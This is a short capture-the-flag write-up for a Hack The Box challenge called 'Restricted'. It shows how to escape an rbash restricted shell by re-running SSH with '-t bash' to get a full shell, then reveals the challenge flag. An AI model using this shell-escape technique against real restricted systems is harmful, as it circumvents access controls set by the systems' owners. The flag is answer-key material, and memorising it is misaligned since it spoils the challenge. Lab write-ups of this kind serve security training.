# misc/Restricted

### Description
> You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment ?

We have access to shell

`ssh restricted@165.232.108.249 -p 30824`

Here we can use `export` command:

```declare -x HOME="/home/restricted"
declare -x LANG="en_US.UTF-8"
declare -x LOGNAME="restricted"
declare -x MOTD_SHOWN="pam"
declare -x OLDPWD
declare -rx PATH="/home/restricted/.bin"
declare -x PWD="/home/restricted"
declare -rx SHELL="/bin/rbash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="165.232.108.249 37187 1337"
declare -x SSH_CONNECTION="165.232.108.249 37187 10.244.14.59 1337"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm-256color"
declare -x USER="restricted"
```
Here we can see second ssh connection in local network, we can connect to it with pseudo-terminal

`ssh 10.244.14.59 -p 1337 -t bash`

Flag is located in /flag_8dpsy

*HTB{r35tr1ct10n5_4r3_p0w3r1355}*

